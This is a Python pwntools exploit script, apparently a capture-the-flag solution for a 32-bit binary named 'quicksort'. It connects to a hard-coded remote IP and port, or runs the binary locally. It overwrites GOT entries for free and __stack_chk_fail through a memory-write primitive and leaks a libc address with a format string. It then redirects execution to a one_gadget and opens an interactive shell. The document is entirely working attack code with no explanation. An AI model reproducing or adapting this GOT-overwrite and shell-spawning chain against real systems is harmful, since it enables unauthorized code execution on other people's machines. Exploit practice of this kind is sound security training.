#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
	p = process('./quicksort')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('34.92.96.238', 10000)
	libc = ELF('./libc.so.6')
elf = ELF('./quicksort')
g = lambda x: next(elf.search(asm(x)))
gets_plt = elf.plt['gets']
gets_got = elf.got['gets']
puts_plt = elf.plt['puts'] # 0x8048560
puts_got = elf.got['puts'] # 0x804a02c
free_got = elf.got['free'] # 0x804a018
atoi_got = elf.got['atoi']
printf_got = elf.got['printf']
printf_plt = elf.plt['printf']
func = 0x08048816
buf = 0x0804a000 + 0x800 # 0x0804b000 - 0x100
stack_chk_fail_got = elf.got['__stack_chk_fail']
#gdb.attach(p, '''
#b *0x80489aa
#''')

def write(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr)
	p.recvuntil('number:')
	p.sendline(payload)

def overflow(addr, val, t):
	payload = str(val)
	payload += (0x10 - len(payload)) * '\x00'
	payload += p32(t)
	payload += (0x1C - len(payload)) * '\x00'
	payload += p32(addr) + '\x00' * 4
	p.recvuntil('number:')
	p.sendline(payload)

t = 2
p.recvuntil('sort?\n')
p.sendline(str(t))
write(free_got, printf_plt, 2)
write(stack_chk_fail_got, func, 2)
fmt = '%6$p' # '%5$p'
overflow(buf, str(int(fmt[::-1].encode('hex'), 16)), 1)
p.recvuntil('0x')
libc_base = int(p.recv(8), 16) - 0x1b3864 # 0x1da010
success('libc_base = ' + hex(libc_base))
one_gadget = libc_base + 0x3ac62
success('one_gadget = ' + hex(one_gadget))
one_gadget_complement = -(0x100000000 - one_gadget)
success('one_gadget_complement = ' + hex(one_gadget_complement))

p.recvuntil('sort?\n')
p.sendline(str(t))
# write(free_got, one_gadget_complement, 1)
overflow(stack_chk_fail_got, one_gadget_complement, 1)
# write(stack_chk_fail_got, one_gadget & 0xffff, 2)
# overflow(stack_chk_fail_got + 2, (one_gadget & 0xffff0000) >> 16, 1)
p.interactive()
